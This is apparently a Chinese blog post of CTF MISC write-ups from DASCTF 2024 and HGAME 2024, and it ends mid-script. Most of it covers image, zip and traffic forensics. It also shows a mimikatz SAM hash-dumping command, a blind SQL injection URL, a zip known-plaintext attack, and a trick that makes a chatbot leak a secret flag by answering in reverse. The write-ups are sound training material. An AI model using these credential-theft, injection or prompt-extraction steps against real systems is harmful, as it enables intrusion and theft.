png，先拖进winhex看看，发现文件尾有明显base64特征字符，解码得到：\nCongratulations on finding the first paragraph of flag, but the understanding of png is just beginning. flag1:DASCTF{2fd9e9ff-e27 看看图片属性，发现位深32，判断图片为RGBA模式，先用zsteg试了下没出东西，再仔细观察图片，发现图片上端有明显的灰色区域，判断应该是Alpha通道存在隐写：\n得到flag2:\nd-5405-c5f5 将flag.png拖到010Editor里面可以看到输出中直接Error了，观察到在chunk[4] IDAT数据块未满的情况下还有chunk[5] IDAT数据块，显然这一块是多出来的部分：\n同时注意到有zlib文件头 78 9C ，而每个 PNG 图片都包含 zlib 压缩过的图像数据，这块应该是另外一张png的数据部分，头尾照搬原png，然后爆破宽高，可以拿到隐藏的图片：\nimport zlib import struct import argparse import itertools from PIL import Image import os #关于PNG格式可以自行上网查阅资料，资料还是挺丰富的，完全足够了解PNG文件格式 index = 0 filename = \u0026#39;flag.png\u0026#39; with open(filename, \u0026#39;rb+\u0026#39;) as file: bin_data = file.read() for width, height in itertools.product(range(498,510), range(498,510)): file.seek(0x12) file.write(struct.pack(\u0026#39;!H\u0026#39;, width)) file.flush() file.seek(0x16) file.write(struct.pack(\u0026#39;!H\u0026#39;, height)) file.flush() for colortype in [2,6]: ## 颜色类型：2：真彩色图像； 6：带α通道数据的真彩色图像 file.seek(0x19) file.write(chr(colortype).encode()) file.flush() crc32_data = crc32_data = b\u0026#34;\\x49\\x48\\x44\\x52\\x00\\x00\u0026#34; + struct.pack(\u0026#39;!H\u0026#39;, width) + b\u0026#34;\\x00\\x00\u0026#34; + struct.pack(\u0026#39;!H\u0026#39;, height) + b\u0026#34;\\x08\u0026#34; + chr(colortype).encode() + b\u0026#34;\\x00\\x00\\x00\u0026#34; crc32 = zlib.crc32(crc32_data) file.seek(0x1D) file.write(crc32.to_bytes(4,\u0026#39;big\u0026#39;)) file.flush() file.seek(0x00) try: index += 1 f = open(\u0026#34;./FINAL/hidden{}.png\u0026#34;.format(index),\u0026#34;wb+\u0026#34;) f.write(file.read()) f.close() img = Image.open(\u0026#34;./FINAL/hidden{}.png\u0026#34;.format(index)) img.show() img.close() except OSError: try: os.remove(\u0026#34;./FINAL/hidden{}.png\u0026#34;.format(index)) except PermissionError: pass 在网上没找到爆破 未知crc且未知图片宽高 的png脚本，自己写了一个，但是有点问题，只能小范围爆破宽高，靠近正确宽高的时候会爆出很多图片，其实用起来也不方便，之后再看看有没有办法优化\n下面是上述脚本运行后结果，这么点范围都有这么多图片，稍微大一点就更不用说了，还是挺麻烦的：\n看图拿到flag3：\na19131f86216} 三段合成完整flag：\nDASCTF{2fd9e9ff-e27d-5405-c5f5a19131f86216} 2.EZ_zip 附件只有一个zip文件，直接解压会报错，想到应该是zip文件格式出了问题\n010Editor打开，先从文件头开始看，对着zip格式查查，或者拿个正常zip文件对比着看，发现在001Ah处的 FileNameLength 不对，应为7，不过这一处问题好像不影响解压(\n中间数据看不出什么东西来，直接看文件尾\n如果是正常的zip文件，尾部会有一块叫dirEntry的部分，显然这个文件没有，对比着正常文件看，发现有两处问题\n首先 FileNameLength为7，其次是 COMPTYPE deCompression 的问题，关于这个数值为何是8，是因为文件头也有这部分内容：\n这部分内容是关于压缩方式的，将文件尾对应部分改为8即可：\n接下来就可以正常解压得到320.zip，能看到其中有注释 just a byte，应该指密码为一字节\n同时考虑到320.zip中有319.zip，应该总共是有320个压缩包，加上字节密码会有不可打印字符，无论如何都要用到脚本来批量解压缩：\nimport pyzipper key1 = \u0026#34;\u0026#34; #获取key是解压后的问题 for i in range(320,0,-1): zip_file_path = \u0026#34;待解压文件目录\u0026#34; + \u0026#34;\\{}.zip\u0026#34;.format(i) with pyzipper.AESZipFile(zip_file_path) as extracted_zip: for pwd in range(0x00,0x100): #一字节密码ASCII值范围 password = bytes([ord(chr(pwd))]) #转字节 try: extracted_zip.extractall(path=r\u0026#34;解压得到文件的保存目录\u0026#34;,pwd=password) key1 += hex(pwd).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(2,\u0026#34;0\u0026#34;) break except: pass key2 = \u0026#34;\u0026#34; #key逆置是因为按照正常解压顺序得到的key无法解AES for i in range(len(key1)//2): key2 += key1[len(key1)-2*i-2:len(key1)-2*i] with open(\u0026#34;key.txt\u0026#34;,\u0026#34;w\u0026#34;) as f: f.write(key2) 解压后能得到 320个zip文件 和 1个AES-ECB.txt，内容为：\n64ZpNmbv2Hg4Jj9bH8Kv6D3OBliD9hgyI3vZWfMDJs2TcEwVnBmH/zkBtPBE3g8e the key may be on your journey？ 根据提示回头找key，上述脚本中已获取，可以发现key.txt中有重复区段，整理后如下：\nc64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11 拿去解AES可以得到flag：\n","permalink":"https://blog.w8nn9z.top/posts/ctf/dasctf-2024-%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-misc-writeup/","summary":"","title":"DASCTF 2024暑期挑战赛 MISC Writeup"},{"content":" HGAME 2024 WEEK1 1.SignIn 下载附件得到一张图片 网上搜图看见许多类似的，其中有一张有注释 将图片传到手机上从充电口看即可得到flag hgame{WOW_GREAT_YOU_SEE_IT_WONDERFUL}\n2.来自星尘的问候 一个即将发售的游戏的主角薇^3带来了一条消息。这段消息隐藏在加密的图片里 但即使解开了图片的六位弱加密,看到的也是一张迷惑的图片。 也许游戏的官网上有这种文字的记录? 补充：flag格式为hgame\\{[a-z0-9_]+\\}\n下载附件得到 secret.jpg 不认识但是可爱捏 网上搜图搜到这样的内容 直接搜索下面的文字内容 即将发售的游戏为 来自星尘 图片有6位弱加密，猜测为123456\nsteghide extract -sf secret.jpg -p 123456\n得到secret.zip exa.png内容： 经过一番搜索才知道这是 异星文字（？ 又经过一番搜索，最终在B站找到较为完整的文字解读 根据flag格式和一点推测（有两个异星文字没找到对应字母,c和0） hgame{welc0me!}\n3.simple_attack 怎么解开这个压缩包呢？\n下载附件压缩包 src.zip src.zip未加密 attchment.zip已加密 二者共含文件103223799_p0.jpg 基本确定为 明文攻击 ARCHPR 工具解得密钥 保存解开的压缩包并打开 photo.txt中含有DATA URL,浏览器url输入打开即可 4.希儿希儿希尔 Ch405是一名忠实的希儿厨，于是他出了一道这样的题，不过他似乎忘了这个加密的名字不是希儿了（x虽然经常有人叫错 补充： 图片打不开是正常现象,需要修复 最终得到的大写字母请用hgame{}包裹\n下载得到secret.png，要进行图片修复，拉到winhex中查看 PNG文件头没问题，可能是宽高被修改过 进行CRC校验来判断 计算CRC校验码之前，需要了解相关内容: 头部数据块长度， 文件头数据块标识（IDCH）, 13位数据块（IDHR） 剩余四字节为该png的CRC检验码 12 1B 80 4D 与我们计算的CRC校验码进行比较 显然不同 用python脚本修复: 得到正确宽高: 宽:00 00 05 72 高:00 00 07 cf 得到修复图片: 好看捏 既然是希尔加密，应该有密钥和密文 经过一些尝试，发现LSB隐写和文件分离 stegsolve解决LSB隐写问题: binwalk或foremost解决文件分离问题: binwalk -e 图片名.png foremost 图片名.png 密文：CVOCRJGMKLDJGBQIUIVXHEYLPNWR 在线工具解希尔密码： 根据格式提交flag hgame{DISAPPEARINTHESEAOFBUTTERFLY}\n5.签到 hgame{welc0me_t0_HGAME2024}\nHGAME 2024 WEEK2 1.ek1ng_want_girlfriend An introducation to Wireshark and also ek1ng. 提示1 尝试用Wireshark从HTTP流量中提取文件\n流量分析，追踪http协议\n截获上传的jpg图片内容\n导出分组字节流，添加后缀为.jpg，flag在jpg图片底部\n2.ezWord 通过破译图片的水印来解开文档里的秘密吧\n压缩包解压缩获得 这是一个word文档.docx\n打开就一张图片，根据题目描述和stegsolve下查看的结果，猜测是盲水印\n既然是盲水印，可能要有原图和水印图才能解出水印内容\n经过一些尝试，将.docx拖入winhex查看，发现藏了点东西，于是binwalk分离文件\n在/word/media中发现关键信息\n获取原图和水印图，进行盲水印的解 使用github上解盲水印的脚本\norigin1.jpg和encode1.png是我改的文件名，得到flag.png，查看水印内容\nT1hi3sI4sKey用来解secret.zip这个加密压缩包，得到secret.txt 一段垃圾邮件\nROT8000 解一下出flag\n3.龙之舞 新年快要到了，来看看龙年的龙之舞吧(～￣▽￣)～请注意，拿到正确的二维码后解码就是flag 但是一开始未必正确\ndeepsound_of_dragon_dance.wav根据音频文件名猜测进行过deepsound隐写\n先听了一遍，开头有点异常，关注开头内容，Audacity分析音频内容\n频谱图中：\n鉴定为反了：\n得到KEY也验证了deepsound隐写的想法\n解出个XXX.zip，里面一个龙之舞.gif\n先看了一遍，右下角有二维码碎片，逐帧分析即可，写个脚本提取每帧图片\n#coding=utf-8 from PIL import Image import os GIF_name = \u0026#34;dragon.gif\u0026#34; GIF = Image.open(GIF_name) GIF_dir = GIF_name[:-4] + \u0026#34;_BreakDown\u0026#34; #[:-4]返回从开头到倒数第五个字符的内容 if not os.path.exists(GIF_dir): os.mkdir(GIF_dir) try: while True: GIF_current = GIF.tell() #开始为0帧 tell()返回当前帧数 GIF.save(GIF_dir + \u0026#34;\\\\\u0026#34; + str(GIF_current) + \u0026#34;.png\u0026#34;) #python中两\\\\表示一\\ GIF.seek(GIF_current + 1) except EOFError: #EOFError是Python中的一个异常类型，表示在读取输入时已经到达了文件的末尾 pass #pass是空语句，用于保持结构的完整性，不做任何事 WPS拼一拼二维码碎片，合成一个大二维码，发现扫不出来\n考虑到每个碎片有两边都是半个方块那么大，应该是两两捆绑的，不存在旋转拼接\n正好前两天在复现NCTF 2022 MISC时也有二维码相关内容\n当时就在下面网站里学了不少有关二维码的知识\nhttps://www.wzhecnu.cn/2022/03/22/programming/gsoc/qr-code-01/\n经过一些尝试，发现是二维码 格式信息 不正确（纠错等级和掩码模式）\n多次尝试，原本的二维码格式信息应该是 L4，扫描得到flag\n解题过程中，找到另一种二维码无法扫描类型的题目\n第七届“湖湘杯” wear_a_mask：\n右图为mask pattern为2时进行的XOR变换\n之后我又翻看了去年HGAME 2023 WEEK2 MISC的官方WP，正好对应上面两题\n这一题的二维码的收获很多\nHGAME 2024 WEEK3 1.简单的vmdk取证 先找到密码吧 flag 格式：hgame{nthash_password} 例如hgame{05D0AB2BB13711B31D5E251C128C889E_happy} 附件下载： 链接：https://pan.baidu.com/s/1IYeZ1oRjo2zO-Wf6mB2TVA 提取码：vics\n.vmdk——虚拟机-虚拟磁盘文件，记录操作系统中所产生的全部数据\n先在VMware中挂载试试，发现需要Administrator的密码\n磁盘取证：打开 DiskGenius \u0026ndash;\u0026gt; 磁盘 \u0026ndash;\u0026gt; 打开虚拟磁盘文件\n我们要找的是用户密码，一般储存在 WINDOWS\\system32\\config\\SAM 中\n将config目录下 SAM 和 system 复制到指定文件夹\n用 mimikatz 获取用户密码hash (注意要将SAM和system复制到mimikatz目录下)\n在SAM和system文件后加上后缀 .hiv，即可使用mimikatz\n.hiv扩展名：当你使用.hiv扩展名时，Mimikatz会将文件视为注册表文件备份，并使用特定的解析逻辑来读取其中的数据。这意味着在提取和查看密码哈希值时，你需要提供对应的SAM文件和系统文件的备份。\nMimikatz对应命令:lsadump::sam /sam:SAM.hiv /system:system.hiv\n获得Administrator的Hash NTLM，在线工具爆一爆(注意提交flag时需要大写字母)\n2.简单的取证,不过前十个有红包 找到veracrypt的文件，拿到flag吧 补充附件： 链接：https://pan.baidu.com/s/19pj-juLLE4BY0lVxFyO4iQ 提取码：ccyk\n附件内容为 vera.hc\n.hc 后缀通常与 VeraCrypt 加密软件相关联。VeraCrypt 是一个开源的磁盘加密工具，用于创建和管理加密的容器文件或整个磁盘分区。\n当您使用 VeraCrypt 创建加密容器时，它会为容器文件分配一个特定的扩展名，通常是 .hc（即 VeraCrypt Hidden Container 的缩写）。\n通过 VeraCrypt 软件，您可以挂载 .hc 容器文件作为一个虚拟磁盘，然后将其视为普通磁盘分区或存储设备。在挂载后，您可以通过输入正确的密码来解密和访问容器中的文件和文件夹。\n于是现在就要获取加密密码，碰巧上一题磁盘中的目录RECYCLER中\n发现有一张jpg图片，上面还写着veracrypt_password，应该就是加密密码\n968fJD17UBzZG6e3yjF6 ，打开veracrypt挂载并输入密码，可以得到原磁盘内容\n在veracrypt中：选择文件 \u0026ndash;\u0026gt; 选个盘符（我选了A） \u0026ndash;\u0026gt; 加载 \u0026ndash;\u0026gt; 输入密码 \u0026ndash;\u0026gt; 确定\n3.与ai聊天 跟他聊一聊吧，从他嘴里翘出flaghttps://udify.app/chat/oRajccxObXREMLlO 注意请不要过快提问\n发现会反着说，想到hgame能不能反着说完，这样就可以得到flag\n4.Blind SQL Injection Blind SQL Injection but in Misc\n附件是一段流量包，判断为流量分析SQL盲注，用wireshark分析\n根据SQL盲注特性，过滤出http协议内容，再根据网页回显内容不同，获取所需\n举流量里SQL盲注中一句为例\nhttp://3c97f319-92cf-4ba5-a3f2-6bd644abe921.node5.buuoj.cn:81/search.php?id=1-(ascii(substr((Select(reverse(group_concat(password)))From(F1naI1y)),6,1))\u0026gt;31) 需要注意reverse将获取的password倒置了，写脚本时要再倒置一次\n判断 F1naI1y表 中 字段password 倒置后的第6个字符对应ASCII码是否大于31\n经过多次判断查回显，最后可以获得一个 \u0026gt;x\u0026amp;\u0026amp;\u0026lt;=x+1 的范围，ASCII码即为x+1\n这是当时做题时的分析，也包括了password对应ASCII码的内容(倒置的)\n写个简单脚本，得到flag\nc = [125,102,50,102,97,56,50,57,53,99,56,51,100,45,54,99,97,98,45,56,57,101,52,45,53,50,55,49,45,55,101,102,97,98,97,98,99,123,103,97,108,102,44][::-1] flag = \u0026#39;\u0026#39; for i in c: flag += chr(i) print (flag) 运行结果:\nHGAME 2024 WEEK4 1.ezKeyboard 本来是个签到题，但有时候往往事与愿违\n流量不需要修复，出题人拿自己电脑现抓的一段流量，他本身就是这样的。 本题键盘流量的 HID Data 格式和常见的格式略有不同，但本质如一。 你需要辩证看待这些个脚本网络上的脚本。他们大多出自一家，没几十行的核心代码里，都毫不例外地保留了数个编程初学者常犯的致命失误。 相信自己的水平，从头写一个脚本往往比找别人的错误容易。 使用wireshark进行USB流量分析，把一些特殊的流量导出\n我导出了可能有用的三段，但是有一段不会用，也可能没什么用（\n第一段内容：\n感觉开头的01没什么用，提取一下敲击内容：\nnormalkeys = {\u0026#34;04\u0026#34;:\u0026#34;a\u0026#34;, \u0026#34;05\u0026#34;:\u0026#34;b\u0026#34;, \u0026#34;06\u0026#34;:\u0026#34;c\u0026#34;, \u0026#34;07\u0026#34;:\u0026#34;d\u0026#34;, \u0026#34;08\u0026#34;:\u0026#34;e\u0026#34;, \u0026#34;09\u0026#34;:\u0026#34;f\u0026#34;, \u0026#34;0a\u0026#34;:\u0026#34;g\u0026#34;, \u0026#34;0b\u0026#34;:\u0026#34;h\u0026#34;, \u0026#34;0c\u0026#34;:\u0026#34;i\u0026#34;, \u0026#34;0d\u0026#34;:\u0026#34;j\u0026#34;, \u0026#34;0e\u0026#34;:\u0026#34;k\u0026#34;, \u0026#34;0f\u0026#34;:\u0026#34;l\u0026#34;, \u0026#34;10\u0026#34;:\u0026#34;m\u0026#34;, \u0026#34;11\u0026#34;:\u0026#34;n\u0026#34;, \u0026#34;12\u0026#34;:\u0026#34;o\u0026#34;, \u0026#34;13\u0026#34;:\u0026#34;p\u0026#34;, \u0026#34;14\u0026#34;:\u0026#34;q\u0026#34;, \u0026#34;15\u0026#34;:\u0026#34;r\u0026#34;, \u0026#34;16\u0026#34;:\u0026#34;s\u0026#34;, \u0026#34;17\u0026#34;:\u0026#34;t\u0026#34;, \u0026#34;18\u0026#34;:\u0026#34;u\u0026#34;, \u0026#34;19\u0026#34;:\u0026#34;v\u0026#34;, \u0026#34;1a\u0026#34;:\u0026#34;w\u0026#34;, \u0026#34;1b\u0026#34;:\u0026#34;x\u0026#34;, \u0026#34;1c\u0026#34;:\u0026#34;y\u0026#34;, \u0026#34;1d\u0026#34;:\u0026#34;z\u0026#34;,\u0026#34;1e\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;1f\u0026#34;:\u0026#34;2\u0026#34;, \u0026#34;20\u0026#34;:\u0026#34;3\u0026#34;, \u0026#34;21\u0026#34;:\u0026#34;4\u0026#34;, \u0026#34;22\u0026#34;:\u0026#34;5\u0026#34;, \u0026#34;23\u0026#34;:\u0026#34;6\u0026#34;,\u0026#34;24\u0026#34;:\u0026#34;7\u0026#34;,\u0026#34;25\u0026#34;:\u0026#34;8\u0026#34;,\u0026#34;26\u0026#34;:\u0026#34;9\u0026#34;,\u0026#34;27\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;28\u0026#34;:\u0026#34;\u0026lt;RET\u0026gt;\u0026#34;,\u0026#34;29\u0026#34;:\u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;,\u0026#34;2a\u0026#34;:\u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;:\u0026#34;\\t\u0026#34;,\u0026#34;2c\u0026#34;:\u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;,\u0026#34;2d\u0026#34;:\u0026#34;-\u0026#34;,\u0026#34;2e\u0026#34;:\u0026#34;=\u0026#34;,\u0026#34;2f\u0026#34;:\u0026#34;[\u0026#34;,\u0026#34;30\u0026#34;:\u0026#34;]\u0026#34;,\u0026#34;31\u0026#34;:\u0026#34;\\\\\u0026#34;,\u0026#34;32\u0026#34;:\u0026#34;\u0026lt;NON\u0026gt;\u0026#34;,\u0026#34;33\u0026#34;:\u0026#34;;\u0026#34;,\u0026#34;34\u0026#34;:\u0026#34;\u0026#39;\u0026#34;,\u0026#34;35\u0026#34;:\u0026#34;`\u0026#34;,\u0026#34;36\u0026#34;:\u0026#34;,\u0026#34;,\u0026#34;37\u0026#34;:\u0026#34;.\u0026#34;,\u0026#34;38\u0026#34;:\u0026#34;/\u0026#34;,\u0026#34;39\u0026#34;:\u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;,\u0026#34;3a\u0026#34;:\u0026#34;\u0026lt;F1\u0026gt;\u0026#34;,\u0026#34;3b\u0026#34;:\u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;:\u0026#34;\u0026lt;F3\u0026gt;\u0026#34;,\u0026#34;3d\u0026#34;:\u0026#34;\u0026lt;F4\u0026gt;\u0026#34;,\u0026#34;3e\u0026#34;:\u0026#34;\u0026lt;F5\u0026gt;\u0026#34;,\u0026#34;3f\u0026#34;:\u0026#34;\u0026lt;F6\u0026gt;\u0026#34;,\u0026#34;40\u0026#34;:\u0026#34;\u0026lt;F7\u0026gt;\u0026#34;,\u0026#34;41\u0026#34;:\u0026#34;\u0026lt;F8\u0026gt;\u0026#34;,\u0026#34;42\u0026#34;:\u0026#34;\u0026lt;F9\u0026gt;\u0026#34;,\u0026#34;43\u0026#34;:\u0026#34;\u0026lt;F10\u0026gt;\u0026#34;,\u0026#34;44\u0026#34;:\u0026#34;\u0026lt;F11\u0026gt;\u0026#34;,\u0026#34;45\u0026#34;:\u0026#34;\u0026lt;F12\u0026gt;\u0026#34;} shiftkeys = {\u0026#34;04\u0026#34;:\u0026#34;A\u0026#34;, \u0026#34;05\u0026#34;:\u0026#34;B\u0026#34;, \u0026#34;06\u0026#34;:\u0026#34;C\u0026#34;, \u0026#34;07\u0026#34;:\u0026#34;D\u0026#34;, \u0026#34;08\u0026#34;:\u0026#34;E\u0026#34;, \u0026#34;09\u0026#34;:\u0026#34;F\u0026#34;, \u0026#34;0a\u0026#34;:\u0026#34;G\u0026#34;, \u0026#34;0b\u0026#34;:\u0026#34;H\u0026#34;, \u0026#34;0c\u0026#34;:\u0026#34;I\u0026#34;, \u0026#34;0d\u0026#34;:\u0026#34;J\u0026#34;, \u0026#34;0e\u0026#34;:\u0026#34;K\u0026#34;, \u0026#34;0f\u0026#34;:\u0026#34;L\u0026#34;, \u0026#34;10\u0026#34;:\u0026#34;M\u0026#34;, \u0026#34;11\u0026#34;:\u0026#34;N\u0026#34;, \u0026#34;12\u0026#34;:\u0026#34;O\u0026#34;, \u0026#34;13\u0026#34;:\u0026#34;P\u0026#34;, \u0026#34;14\u0026#34;:\u0026#34;Q\u0026#34;, \u0026#34;15\u0026#34;:\u0026#34;R\u0026#34;, \u0026#34;16\u0026#34;:\u0026#34;S\u0026#34;, \u0026#34;17\u0026#34;:\u0026#34;T\u0026#34;, \u0026#34;18\u0026#34;:\u0026#34;U\u0026#34;, \u0026#34;19\u0026#34;:\u0026#34;V\u0026#34;, \u0026#34;1a\u0026#34;:\u0026#34;W\u0026#34;, \u0026#34;1b\u0026#34;:\u0026#34;X\u0026#34;, \u0026#34;1c\u0026#34;:\u0026#34;Y\u0026#34;, \u0026#34;1d\u0026#34;:\u0026#34;Z\u0026#34;,\u0026#34;1e\u0026#34;:\u0026#34;!\u0026#34;, \u0026#34;1f\u0026#34;:\u0026#34;@\u0026#34;, \u0026#34;20\u0026#34;:\u0026#34;#\u0026#34;, \u0026#34;21\u0026#34;:\u0026#34;$\u0026#34;, \u0026#34;22\u0026#34;:\u0026#34;%\u0026#34;, \u0026#34;23\u0026#34;:\u0026#34;^\u0026#34;,\u0026#34;24\u0026#34;:\u0026#34;\u0026amp;\u0026#34;,\u0026#34;25\u0026#34;:\u0026#34;*\u0026#34;,\u0026#34;26\u0026#34;:\u0026#34;(\u0026#34;,\u0026#34;27\u0026#34;:\u0026#34;)\u0026#34;,\u0026#34;28\u0026#34;:\u0026#34;\u0026lt;RET\u0026gt;\u0026#34;,\u0026#34;29\u0026#34;:\u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;,\u0026#34;2a\u0026#34;:\u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;:\u0026#34;\\t\u0026#34;,\u0026#34;2c\u0026#34;:\u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;,\u0026#34;2d\u0026#34;:\u0026#34;_\u0026#34;,\u0026#34;2e\u0026#34;:\u0026#34;+\u0026#34;,\u0026#34;2f\u0026#34;:\u0026#34;{\u0026#34;,\u0026#34;30\u0026#34;:\u0026#34;}\u0026#34;,\u0026#34;31\u0026#34;:\u0026#34;|\u0026#34;,\u0026#34;32\u0026#34;:\u0026#34;\u0026lt;NON\u0026gt;\u0026#34;,\u0026#34;33\u0026#34;:\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;34\u0026#34;:\u0026#34;:\u0026#34;,\u0026#34;35\u0026#34;:\u0026#34;~\u0026#34;,\u0026#34;36\u0026#34;:\u0026#34;\u0026lt;\u0026#34;,\u0026#34;37\u0026#34;:\u0026#34;\u0026gt;\u0026#34;,\u0026#34;38\u0026#34;:\u0026#34;?\u0026#34;,\u0026#34;39\u0026#34;:\u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;,\u0026#34;3a\u0026#34;:\u0026#34;\u0026lt;F1\u0026gt;\u0026#34;,\u0026#34;3b\u0026#34;:\u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;:\u0026#34;\u0026lt;F3\u0026gt;\u0026#34;,\u0026#34;3d\u0026#34;:\u0026#34;\u0026lt;F4\u0026gt;\u0026#34;,\u0026#34;3e\u0026#34;:\u0026#34;\u0026lt;F5\u0026gt;\u0026#34;,\u0026#34;3f\u0026#34;:\u0026#34;\u0026lt;F6\u0026gt;\u0026#34;,\u0026#34;40\u0026#34;:\u0026#34;\u0026lt;F7\u0026gt;\u0026#34;,\u0026#34;41\u0026#34;:\u0026#34;\u0026lt;F8\u0026gt;\u0026#34;,\u0026#34;42\u0026#34;:\u0026#34;\u0026lt;F9\u0026gt;\u0026#34;,\u0026#34;43\u0026#34;:\u0026#34;\u0026lt;F10\u0026gt;\u0026#34;,\u0026#34;44\u0026#34;:\u0026#34;\u0026lt;F11\u0026gt;\u0026#34;,\u0026#34;45\u0026#34;:\u0026#34;\u0026lt;F12\u0026gt;\u0026#34;} with open(\u0026#39;hgame2.txt\u0026#39;) as data: for line in data: information1=line[6:8] information2=line[8:10] if information1==\u0026#39;00\u0026#39;: continue if line[3]==\u0026#39;2\u0026#39;: #shiftkey print (shiftkeys[information1],end=\u0026#39;\u0026#39;) #end=\u0026#39;\u0026#39;以空字符替换原默认换行符 if information2!=\u0026#39;00\u0026#39;: print (shiftkeys[information2],end=\u0026#39;\u0026#39;) if line[3]==\u0026#39;0\u0026#39;: #normalkey print (normalkeys[information1],end=\u0026#39;\u0026#39;) if information2!=\u0026#39;00\u0026#39;: print (normalkeys[information2],end=\u0026#39;\u0026#39;) 运行结果：\nhgame{k_\u0026lt;DEL\u0026gt;e\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;y\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;b0a1d\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;_\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;gam0\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;_\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;_\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;15\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;_\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;s0\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;_\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;\u0026lt;CAP\u0026gt;1nst\u0026lt;DEL\u0026gt;\u0026lt;DEL\u0026gt;\u0026lt;DEL\u0026gt;\u0026lt;DEL\u0026gt;f0n__!!~~\u0026lt;CAP\u0026gt;~~\u0026lt;CAP\u0026gt;} 整理一下：\n但是提交发现flag不对，感觉怪怪的\n赛后看了官方wp找到问题了，这里也贴出能得到正确flag的脚本：\nnormalKeys = {\u0026#34;04\u0026#34;: \u0026#34;a\u0026#34;, \u0026#34;05\u0026#34;: \u0026#34;b\u0026#34;, \u0026#34;06\u0026#34;: \u0026#34;c\u0026#34;, \u0026#34;07\u0026#34;: \u0026#34;d\u0026#34;, \u0026#34;08\u0026#34;: \u0026#34;e\u0026#34;, \u0026#34;09\u0026#34;: \u0026#34;f\u0026#34;, \u0026#34;0a\u0026#34;: \u0026#34;g\u0026#34;, \u0026#34;0b\u0026#34;: \u0026#34;h\u0026#34;, \u0026#34;0c\u0026#34;: \u0026#34;i\u0026#34;, \u0026#34;0d\u0026#34;: \u0026#34;j\u0026#34;, \u0026#34;0e\u0026#34;: \u0026#34;k\u0026#34;, \u0026#34;0f\u0026#34;: \u0026#34;l\u0026#34;, \u0026#34;10\u0026#34;: \u0026#34;m\u0026#34;, \u0026#34;11\u0026#34;: \u0026#34;n\u0026#34;, \u0026#34;12\u0026#34;: \u0026#34;o\u0026#34;, \u0026#34;13\u0026#34;: \u0026#34;p\u0026#34;, \u0026#34;14\u0026#34;: \u0026#34;q\u0026#34;, \u0026#34;15\u0026#34;: \u0026#34;r\u0026#34;, \u0026#34;16\u0026#34;: \u0026#34;s\u0026#34;, \u0026#34;17\u0026#34;: \u0026#34;t\u0026#34;, \u0026#34;18\u0026#34;: \u0026#34;u\u0026#34;, \u0026#34;19\u0026#34;: \u0026#34;v\u0026#34;, \u0026#34;1a\u0026#34;: \u0026#34;w\u0026#34;, \u0026#34;1b\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;1c\u0026#34;: \u0026#34;y\u0026#34;, \u0026#34;1d\u0026#34;: \u0026#34;z\u0026#34;, \u0026#34;1e\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;1f\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;20\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;21\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;22\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;23\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;24\u0026#34;: \u0026#34;7\u0026#34;, \u0026#34;25\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;26\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;27\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;28\u0026#34;: \u0026#34;\u0026lt;RET\u0026gt;\u0026#34;, \u0026#34;29\u0026#34;: \u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;, \u0026#34;2a\u0026#34;: \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;: \u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;: \u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;: \u0026#34;-\u0026#34;, \u0026#34;2e\u0026#34;: \u0026#34;=\u0026#34;, \u0026#34;2f\u0026#34;: \u0026#34;[\u0026#34;, \u0026#34;30\u0026#34;: \u0026#34;]\u0026#34;, \u0026#34;31\u0026#34;: \u0026#34;\\\\\u0026#34;, \u0026#34;32\u0026#34;: 